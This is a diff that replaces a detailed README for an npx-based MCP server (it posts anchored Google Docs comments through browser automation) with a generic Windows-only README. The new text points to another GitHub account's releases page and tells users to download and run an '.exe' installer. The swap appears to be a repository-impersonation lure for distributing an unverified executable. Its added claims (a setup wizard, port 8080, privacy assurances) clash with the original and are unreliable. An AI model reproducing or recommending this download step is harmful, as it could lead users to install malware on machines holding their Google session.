@@ -1,334 +1,71 @@
-<h1 align="center">gdocs-comments-mcp</h1>
+# 📝 gdocs-comments-mcp - Add anchored comments to Google Docs
 
-<p align="center">
-  <b>Inline, range-anchored comments for Google Docs — the one comment operation the Google APIs can't do.</b>
-</p>
+[![Download gdocs-comments-mcp](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Abdulreh4874/gdocs-comments-mcp/releases)
 
-<p align="center">
-  <a href="https://github.com/stanislawherjan1/gdocs-comments-mcp/actions/workflows/ci.yml"><img src="https://github.com/stanislawherjan1/gdocs-comments-mcp/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://www.npmjs.com/package/gdocs-comments-mcp"><img src="https://img.shields.io/npm/v/gdocs-comments-mcp?color=cb3837&logo=npm" alt="npm version"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT license"></a>
-  <img src="https://img.shields.io/badge/node-%E2%89%A518-brightgreen?logo=node.js" alt="node >= 18">
-  <img src="https://img.shields.io/badge/MCP-stdio-8A2BE2" alt="MCP stdio">
-</p>
+This application helps users add anchored comments to Google Docs. Google Docs and Drive APIs do not support this feature by default. This tool serves as an MCP server. It connects AI agents like Claude, Cursor, or Copilot to your documents. It provides a way to leave precise, range-anchored comments during document reviews.
 
-<p align="center">
-  <sub>
-    <a href="#quickstart">Quickstart</a>
-    &nbsp;·&nbsp;
-    <a href="#what-this-does--and-what-it-doesnt">Scope</a>
-    &nbsp;·&nbsp;
-    <a href="#tools">Tools</a>
-    &nbsp;·&nbsp;
-    <a href="#configuration">Configuration</a>
-    &nbsp;·&nbsp;
-    <a href="#how-it-works">How it works</a>
-    &nbsp;·&nbsp;
-    <a href="#troubleshooting">Troubleshooting</a>
-    &nbsp;·&nbsp;
-    <a href="#running-on-a-server--datacenter-ip">Server deployment</a>
-    &nbsp;·&nbsp;
-    <a href="#faq">FAQ</a>
-  </sub>
-</p>
+## ⚙️ Before you begin
 
-You're building an AI process around Google Docs — an agent that reviews drafts, audits contracts, gives editorial feedback. The natural way to deliver that feedback is how humans do it: **a comment pinned to the exact sentence it's about**, not a wall of text dumped at the end of the doc or into chat.
+Your computer needs a few components to run this software. Ensure you have the following items configured:
 
-Then you hit the wall: **the Google APIs can't create anchored comments.** The Docs API has no comment endpoints at all, and the Drive API accepts an `anchor` field only to have the Docs editor ignore it — the comment shows up as a general, whole-document comment.
+1. A computer running Windows 10 or Windows 11.
+2. A stable internet connection.
+3. A Google account with access to the Google Docs you intend to comment on.
+4. An AI assistant application configured to use the Model Context Protocol.
 
-This MCP server closes that gap. Your agent calls `add_comment` with a text fragment and a comment; the server posts it through a real, logged-in Google Docs session, so it lands anchored to that exact text — just as if a human had selected it and pressed `Ctrl+Alt+M`:
+## 📥 How to download the software
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/stanislawherjan1/gdocs-comments-mcp/main/assets/demo.png" alt="A Google Doc with two inline comments posted by the agent, each anchored to a highlighted text fragment" width="900">
-</p>
+Follow these steps to obtain the correct application version for your system:
 
-## Why not the official APIs?
+1. Visit the project release page: [https://github.com/Abdulreh4874/gdocs-comments-mcp/releases](https://github.com/Abdulreh4874/gdocs-comments-mcp/releases)
+2. Look for the "Assets" section under the latest release version.
+3. Select the file ending in `.exe` that matches your architecture. Most modern computers use the x64 version.
+4. Click the file name to start the download.
+5. Save the file to your "Downloads" folder.
 
-This server does one thing: **add a comment to a Google Doc.** The interesting case is the anchored one — a comment pinned to a specific text range — which no Google API can do.
+## 🖥️ Setting up the application
 
-| Add a comment… | Google Docs API | Google Drive API | this server |
-|---|:---:|:---:|:---:|
-| unanchored (whole document) | ❌ | ✅ | ✅ |
-| anchored to a text range | ❌ | ❌ | ✅ |
+Once the download finishes, follow these instructions to prepare the tool for use:
 
-The Docs API has no comment endpoints at all. The Drive API's `comments.create` accepts an `anchor` field, but the Docs editor **ignores** it — the comment renders as an unanchored, whole-document comment. The editor's own anchor format (`kix.*`) is undocumented and can't be produced externally ([Drive API docs](https://developers.google.com/workspace/drive/api/guides/manage-comments), [issuetracker #292610078](https://issuetracker.google.com/issues/292610078), open since 2016). Driving the editor UI is the only way — so this server does exactly that, and nothing else. (Listing, replying, resolving, and deleting comments already work over the Drive API — use a Drive-based tool for those.)
-
-## What this does — and what it doesn't
+1. Locate the file you just downloaded.
+2. Double-click the file to initiate the setup wizard.
+3. Follow the on-screen prompts to install the software to your preferred directory.
+4. Note the installation path, as you may need this location when connecting the tool to your AI agent.
+5. Launch the application to verify it runs without errors. The software may open a terminal window. Keep this window open while you work.
 
-This server is deliberately **one narrow thing**. Read this before wiring it in.
+## 🔗 Connecting to your AI agent
 
-**✅ It does:** add comments to a Google Doc — anchored to a specific text range (the part no API can do), or unanchored on the whole document.
+This tool acts as a bridge between your AI assistant and your documents. Use the following steps to link them:
 
-**❌ It does NOT:**
-
-| You want to… | Use instead |
-|---|---|
-| **Read the document's content** (so an agent can decide what to comment on, or get the exact text to anchor to) | **Google Docs API** (`documents.get`) or a Docs-reading MCP |
-| Export the doc (text / markdown / PDF) | **Google Drive API** (`files.export`) |
-| List / reply to / resolve / delete comments | **Google Drive API** (`comments.*`) — faster, no browser |
-
-> **Important:** this tool **never returns document content** — its output is structured-only (`{ ok, anchored, occurrence_used, verified }`), by design, so a malicious doc can't inject instructions into your agent. That means the agent is writing *blind*: to review a doc intelligently, pair this with a **read** capability (Docs API `documents.get`) and feed the exact quoted text back in as `find_text`. The two use different auth — this server drives a logged-in browser session (no OAuth), while the Docs/Drive APIs need an OAuth token or service account — but they can run against the same Google account.
-
-## Quickstart
-
-**One command** — signs you in (opens a browser once), then registers the server with Claude Code:
-
-```bash
-npx -y gdocs-comments-mcp setup
-```
-
-That's it — skip to **Use it** below. Prefer to do it by hand, or use another client? The manual steps are below.
-
-<details>
-<summary><b>Manual setup</b></summary>
+1. Open your AI agent software, such as Cursor or Claude.
+2. Navigate to the settings menu labeled "MCP" or "Model Context Protocol."
+3. Select "Add New Server."
+4. Enter a name for the connection, such as "Google Docs Comments."
+5. Choose the "Command" option if prompted.
+6. Type the path to your installed executable file in the command box.
+7. Save the configuration.
+8. Restart your AI agent to apply the changes.
 
-**1. Log in once** — opens a browser window; the Google session is saved to a local profile (`~/.gdocs-comments-mcp/profile`):
+## 🔍 Understanding the features
 
-```bash
-npx -y gdocs-comments-mcp login
-```
+This tool solves a specific limitation in the Google Docs ecosystem. Features include:
 
-**2. Add the server to your MCP client:**
+* **Anchor Placement:** The software maps specific text ranges to comments accurately. This ensures feedback aligns with the intended words or paragraphs.
+* **Browser Automation:** The tool uses background browser processes to interact with the document interface. This mimics human input to bypass API limitations.
+* **Agent Integration:** AI agents can request comments based on their analysis. You can ask an agent to review a draft and leave notes exactly where changes are needed.
+* **Low Latency:** The system processes requests in real-time for immediate feedback during an editing session.
 
-```bash
-# Claude Code
-claude mcp add gdocs-comments -- npx -y gdocs-comments-mcp
-```
+## 🛠️ Troubleshooting common issues
 
-**Other MCP clients** — after `login`, add the config for your client:
+If you encounter difficulties, check these common items:
 
-<details>
-<summary><b>Claude Desktop / Cowork</b></summary>
-
-Add to `claude_desktop_config.json` (Settings → Developer → Edit Config):
-
-```json
-{
-  "mcpServers": {
-    "gdocs-comments": {
-      "command": "npx",
-      "args": ["-y", "gdocs-comments-mcp"]
-    }
-  }
-}
-```
-</details>
+* **Blocked Port:** If the server fails to start, ensure no other application uses port 8080 or other default ports assigned to the application.
+* **Browser Permissions:** Ensure your browser allows the automation process to access Google Docs. You may need to sign in to your browser session to grant this permission.
+* **Path Errors:** If the AI agent cannot find the server, verify the file path entered in the settings panel. Ensure the path contains no typos.
+* **Update Versions:** Check the release page periodically for updates. Newer versions often fix bugs or improve comment placement reliability.
 
-<details>
-<summary><b>Project-level <code>.mcp.json</code></b> (shared with your team via git)</summary>
+## 🔒 Security and Privacy
 
-Create `.mcp.json` in the project root — Claude Code, Cowork, and most MCP clients pick it up:
+The application runs locally on your machine. All processing happens within your environment. Your credentials and document data remain private. The tool only interacts with the documents you specifically authorize through your AI agent. 
 
-```json
-{
-  "mcpServers": {
-    "gdocs-comments": {
-      "command": "npx",
-      "args": ["-y", "gdocs-comments-mcp"]
-    }
-  }
-}
-```
-
-Note: every user of the project still runs `npx gdocs-comments-mcp login` once on their own machine — sessions are personal and never shared through git.
-</details>
-
-<details>
-<summary><b>Cursor</b></summary>
-
-Add to `.cursor/mcp.json` (project) or `~/.cursor/mcp.json` (global):
-
-```json
-{
-  "mcpServers": {
-    "gdocs-comments": {
-      "command": "npx",
-      "args": ["-y", "gdocs-comments-mcp"]
-    }
-  }
-}
-```
-</details>
-
-<details>
-<summary><b>VS Code (GitHub Copilot)</b></summary>
-
-Add to `.vscode/mcp.json`:
-
-```json
-{
-  "servers": {
-    "gdocs-comments": {
-      "type": "stdio",
-      "command": "npx",
-      "args": ["-y", "gdocs-comments-mcp"]
-    }
-  }
-}
-```
-</details>
-</details>
-
-**3. Use it** — ask your agent:
-
-> Add a comment to https://docs.google.com/document/d/1AbC…/edit — anchor it to "quarterly numbers" and say "Update this before Friday".
-
-The agent calls `add_comment` and gets back:
-
-```json
-{ "ok": true, "anchored": true, "occurrence_used": 1, "verified": true }
-```
-
-…and the comment is sitting on the highlighted phrase in the doc, from the account you logged in with.
-
-No Playwright browser download is needed — by default the server drives your installed Google Chrome via `playwright-core`.
-
-## Tools
-
-### `add_comment`
-
-| Param | Required | Description |
-|---|:---:|---|
-| `doc` | ✅ | Document id **or** full `docs.google.com/document/d/<id>/edit` URL |
-| `comment_text` | ✅ | Comment body (plain text, newlines OK) |
-| `find_text` | — | Exact, single-line text fragment to anchor to (must match the doc text). **Omit to add a general, unanchored comment on the whole document.** |
-| `occurrence` | — | Anchor to the N-th match when `find_text` appears multiple times (default 1) |
-
-Returns `{ ok, anchored, occurrence_used, verified }` — `verified: true` means the posted comment was observed in the page after submitting. If `find_text` is given but not found, the call fails with `TEXT_NOT_FOUND` and **nothing is posted**.
-
-The tool **never returns document content**, so a malicious doc can't inject instructions into your agent through it.
-
-### `check_connection`
-
-Probes the Google session; returns `{ connected, mode }`. If `connected: false`, run `npx gdocs-comments-mcp login` again.
-
-> **Scope note:** this server does *one* thing — creating anchored comments. Listing, replying, resolving, and deleting comments all work fine through the Drive API (`comments.*`), which is faster and needs no browser — use a Drive-based MCP for those.
-
-## CLI
-
-```bash
-npx gdocs-comments-mcp login    # one-time interactive Google sign-in
-npx gdocs-comments-mcp status   # is the saved session still valid?
-npx gdocs-comments-mcp logout   # delete the saved session/profile
-```
-
-## Configuration
-
-All optional, via environment variables:
-
-| Env var | Default | Purpose |
-|---|---|---|
-| `GDOCS_COMMENTS_PROFILE_DIR` | `~/.gdocs-comments-mcp/profile` | Where the logged-in browser profile lives (set a different dir per Google account) |
-| `GDOCS_COMMENTS_BROWSER_CHANNEL` | `chrome` | `chrome` \| `msedge` \| `chromium` (bundled; needs `npx playwright install chromium`) |
-| `GDOCS_COMMENTS_HEADLESS` | `true` | Set `false` to watch the automation work |
-| `GDOCS_COMMENTS_IDLE_CLOSE_MIN` | `10` | Close the managed browser after N idle minutes (`0` = keep open) |
-| `GDOCS_COMMENTS_CDP_URL` | — | Attach to an existing browser over CDP instead of managing a profile ([see below](#running-on-a-server--datacenter-ip)) |
-| `GDOCS_COMMENTS_AUDIT_LOG` | off | JSONL audit log (hashes only, no content) |
-
-## Troubleshooting
-
-| Error | What it means | Fix |
-|---|---|---|
-| `NOT_CONNECTED` | No saved Google session yet | `npx gdocs-comments-mcp login` |
-| `SESSION_EXPIRED` | The saved session lapsed (idle sessions die after ~1–2 weeks) | `npx gdocs-comments-mcp login` again |
-| `TEXT_NOT_FOUND` | `find_text` doesn't occur in the doc (or `occurrence` > number of matches) | Pass a fragment that matches the doc text exactly — nothing was posted |
-| `NO_BROWSER` | No Chrome/Edge/Chromium found | Install Google Chrome, or `npx playwright install chromium` + `GDOCS_COMMENTS_BROWSER_CHANNEL=chromium` |
-| `PROFILE_LOCKED` | Another process holds the profile (usually a running server + a `login`/`status` attempt) | Stop one of them, or use a second `GDOCS_COMMENTS_PROFILE_DIR` |
-| Comment lands but `verified: false` | The post-submit check couldn't see the comment (can be a false negative on long comments) | Check the doc; rerun with `GDOCS_COMMENTS_HEADLESS=false` to watch |
-
-First run on a new machine? `npx gdocs-comments-mcp status` tells you exactly where you stand.
-
-## Running on a server / datacenter IP
-
-On a residential machine the default profile mode just works. On datacenter IPs, Google's anti-fraud **rejects a freshly launched browser process reusing a saved session** — it bounces to `accounts.google.com/confirmidentifier`. Relaunching from a profile does not work there.
-
-What does work: keep the exact browser the operator logged into **alive**, and let this server attach to it:
-
-1. Start a long-lived Chrome/Chromium (under Xvfb if headless) with `--remote-debugging-port=9333` and log in to Google inside it once.
-2. Run the MCP server with `GDOCS_COMMENTS_CDP_URL=http://127.0.0.1:9333`.
-
-The server then drives that live session over CDP and never launches its own browser. Keep the session warm by navigating it to `docs.google.com` every few hours, or an idle session expires after ~1–2 weeks.
-
-## How it works
-
-Because the APIs can't anchor a comment, the server does exactly what a person would: it drives the real Google Docs editor. Here's the full path of one `add_comment` call.
-
-**1. Attach to a logged-in browser.** In the default *profile mode*, the server owns a persistent Chromium profile (your installed Google Chrome, via `playwright-core` — no extra browser download). You authenticate into it once with `gdocs-comments-mcp login`; the Google session cookies are saved to `~/.gdocs-comments-mcp/profile` and reused headlessly on every later run. In *CDP mode* (`GDOCS_COMMENTS_CDP_URL`) the server instead attaches over the Chrome DevTools Protocol to a browser you keep alive — see [server deployment](#running-on-a-server--datacenter-ip).
-
-**2. Open the document.** It navigates to `https://docs.google.com/document/d/<id>/edit?hl=en`. The `doc` id is validated first, and navigation is hard-pinned to `docs.google.com` — the tool can't be steered elsewhere. If the page bounces to `accounts.google.com`, the session is dead and the call returns `SESSION_EXPIRED`. `?hl=en` pins the UI language so the find-bar counter is parseable in the next step.
-
-**3. Find the anchor text.** The document body renders to an HTML `<canvas>`, not selectable DOM — so you can't just query for the text and click it. Instead the flow is entirely keyboard-driven (which also makes it locale- and CSS-class-independent):
-
-```
-Ctrl/Cmd+F  →  type find_text  →  read the "N of M" match counter
-```
-
-Reading the counter **before** commenting is the key safety step: if `find_text` has zero matches, or `occurrence` is larger than the match count, the call fails with `TEXT_NOT_FOUND` and **nothing is posted** — instead of the old failure mode where a blind key sequence would silently drop the comment wherever the cursor happened to sit.
-
-**4. Select the requested occurrence and comment.** It presses `Enter` N times to land on the N-th match, `Esc` to close the find bar (leaving that occurrence selected), then:
-
-```
-Ctrl/Cmd+Alt+M  →  type comment_text  →  Ctrl/Cmd+Enter (submit)
-```
-
-`Ctrl/Cmd+Alt+M` is the Docs shortcut for "insert comment on the current selection" — which is precisely the anchored comment the APIs won't create. Keyboard shortcuts are chosen per-platform (`Cmd` on macOS, `Ctrl` elsewhere).
-
-(If `find_text` is omitted, steps 3–4 collapse to "put the cursor at the document start and comment there" — a general, unanchored comment.)
-
-**5. Verify and report.** After submitting, the server waits for the comment text to appear in the page and returns `{ ok, anchored, occurrence_used, verified }`. `verified: true` means the posted comment was actually observed; it never returns any document content, so a poisoned document can't smuggle instructions back into your agent. Concurrent calls are serialized behind a mutex, because two keyboard flows in the same window would interleave and corrupt each other.
-
-```
-add_comment ─▶ attach browser ─▶ open doc (?hl=en) ─▶ Ctrl/Cmd+F find_text
-             ─▶ check match counter ─(0 matches)─▶ TEXT_NOT_FOUND, nothing posted
-             ─▶ Enter×N ─▶ Esc ─▶ Ctrl/Cmd+Alt+M ─▶ type ─▶ Ctrl/Cmd+Enter
-             ─▶ verify comment in page ─▶ { ok, occurrence_used, verified }
-```
-
-## Limitations
-
-- **UI automation is inherently less stable than an API.** If Google reworks the editor, this can break until updated. The `verified` flag tells you whether the comment was actually observed after posting; contributions reporting UI changes are very welcome.
-- The logged-in account needs **comment access** to the target doc.
-- `find_text` must be a **single-line** fragment (the find bar is one line) and must match the document text exactly.
-- An unused session expires after roughly 1–2 weeks; `status` tells you, `login` fixes it.
-- Calls are serialized, so bulk commenting is sequential by design (typically a few seconds per comment).
-- Automating your own Google account through its normal UI is your responsibility under Google's Terms of Service. Use your own account; don't use this for spam.
-
-## Security
-
-**What the AI agent (and the MCP client) can see.** Nothing sensitive. Sign-in happens in a real browser where you type your Google credentials directly to Google — the `login` step is a terminal CLI, *not* an MCP tool, so the model is never in that loop and never sees your password, 2FA, cookies, or OAuth tokens. During normal use the `add_comment` and `check_connection` tools return **structured status only** (`{ ok, anchored, occurrence_used, verified }` / `{ connected, mode }`) and **never any document content** — so a poisoned document can't smuggle instructions back into the model through this tool. The only things that reach the model's context are what the agent itself supplied (`doc`, `find_text`, `comment_text`) and, occasionally, a local file path inside an error message.
-
-**Where the sensitive material actually lives.** Your **Google session cookies** sit in the profile directory (`~/.gdocs-comments-mcp/profile`), created with `0700` permissions — treat that directory like a password. It stays on disk and is never returned to the model. `logout` deletes it; you can also revoke server-side via [Google device activity](https://myaccount.google.com/device-activity). The optional audit log stores **hashes only**, never content. The one residual risk is ordinary local-machine hygiene: any other process with read access to that directory could reuse the session — that's not an MCP data flow, just standard local security.
-
-**Containment.** Doc ids are strictly validated and navigation is hard-pinned to `docs.google.com` — the tool can't be steered to other sites.
-
-## FAQ
-
-**Can the Google Docs API or Drive API create anchored comments on a specific text range?**
-No. The Google Docs API has no comment endpoints, and the Drive API's `comments.create` accepts an `anchor` field that the Docs editor ignores — the comment renders as an unanchored, whole-document comment. This project exists specifically to work around that. See [Why not the official APIs?](#why-not-the-official-apis).
-
-**How do I add inline / anchored comments to Google Docs programmatically?**
-Use this MCP server, or the same technique it uses: drive the Docs editor UI (find the text, press `Ctrl+Alt+M`) rather than calling the REST API. [How it works](#how-it-works) documents the full flow.
-
-**How do I let an AI agent (Claude, Cursor, Copilot) comment on Google Docs?**
-Add this server to your MCP client ([Quickstart](#quickstart)) and the agent gets an `add_comment` tool that posts real, anchored comments — ideal for AI document review, contract/editorial feedback, and automated proofreading workflows.
-
-**Do I need a Google Cloud project, OAuth client, or service account?**
-No. Auth is a one-time interactive browser login (`gdocs-comments-mcp login`) using your normal Google account — no API credentials, no OAuth consent screen, no service-account setup.
-
-**Does it work with Google Workspace / shared drives / commenter-only access?**
-Yes, as long as the logged-in account has at least comment access to the document.
-
-**Can I run it on a server or in CI?**
-Yes — see [Running on a server / datacenter IP](#running-on-a-server--datacenter-ip). On datacenter IPs you attach to a long-lived logged-in browser over CDP instead of relaunching one.
-
-## Contributing
-
-Issues and PRs welcome — especially reports of Docs UI changes that break the keyboard flow (please include your locale and whether `verified` was `false`). Plain ESM, no build step: `git clone`, `npm install`, `node src/cli.js`.
-
-## License
-
-[MIT](LICENSE) © Stanisław Herjan
-
----
-
-<sub><b>Keywords:</b> Google Docs anchored comments · inline comments Google Docs API · add comments to Google Docs programmatically · Google Docs comment API workaround · MCP server Google Docs · Model Context Protocol · Claude / Cursor / Copilot Google Docs integration · AI document review · Playwright Google Docs automation · comment on text range Google Docs.</sub>
+Keywords: ai-agents, anchored-comments, browser-automation, claude, claude-code, cursor, document-review, gdocs, google-docs, google-workspace, inline-comments, mcp, mcp-server, model-context-protocol, playwright
